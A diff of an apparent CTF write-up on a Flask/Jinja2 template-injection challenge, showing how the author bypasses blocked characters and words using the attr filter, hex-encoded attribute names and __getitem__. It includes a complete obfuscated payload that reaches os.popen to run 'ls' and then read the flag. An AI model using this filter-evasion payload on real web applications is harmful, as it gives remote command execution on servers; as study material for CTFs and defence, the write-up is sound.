@@ -36,19 +36,37 @@
 
 **Now, our task is to discover the words that this app restricts or blocks.**
 
+
 **After spending some time interacting with the app, I discovered that it blocks certain words, including ".", "cycler," and also prohibits the use of square brackets [].**
+
 
 **We require a method to inject a period (.) and square brackets [] without being blocked by the app. Additionally, we need a way to insert the restricted words.**
 
+
+
 **After conducting some research, I came across a writeup (link provided below) that utilized a function called attr (a built-in filter in Flask). This function enables concatenation between two values and also understands hexadecimal encoding. This can be our workaround to bypass the blocked words and the period (.). For instance, our payload might look like "sau"|attr("hexvaluees").**
+
+
 
 **Additionally, we need a method to represent square brackets ([]). Luckily, there's a function called getitem that we can leverage to select items from the returned array.**
 
+
+
 **So, our current objective is to transform the following code: "sai".__class__.__base__.__subclasses__()[147].__init__.__globals__['sys'].modules['os'].popen("hostname").read() using the upper functions for bypassing.**
+
+
 
 **it will be like this after convertion {{"sai"|attr("\x5F\x5F\x63\x6C\x61\x73\x73\x5F\x5F")|attr("\x5F\x5F\x62\x61\x73\x65\x5F\x5F")|attr("\x5F\x5F\x73\x75\x62\x63\x6C\x61\x73\x73\x65\x73\x5F\x5F")()|attr("\x5f\x5fgetitem\x5f\x5f")(183)|attr("\x5F\x5F\x69\x6E\x69\x74\x5F\x5F")|attr("\x5F\x5F\x67\x6C\x6F\x62\x61\x6C\x73\x5F\x5F")|attr("\x5f\x5fgetitem\x5f\x5f")('sys')|attr("\x6D\x6F\x64\x75\x6C\x65\x73")|attr("\x5f\x5fgetitem\x5f\x5f")('os')|attr("\x70\x6F\x70\x65\x6E")("ls")|attr("\x72\x65\x61\x64")()}}**
 
-**and pingo we can use it to get rce and read the flag**
+
+**lets use the uppper payload to find the flag**
+
+![image](https://github.com/qlashx/ctf_writeups/assets/106611511/4bb087f6-8847-4217-9ddf-7a2473b25086)
+
+**now lets change ls with cat flag** 
+
+
+**and pingo we got the  flag**
 
 ![image](https://github.com/qlashx/ctf_writeups/assets/106611511/982240ef-22dd-45c8-9f65-75923e3fb44a)
 
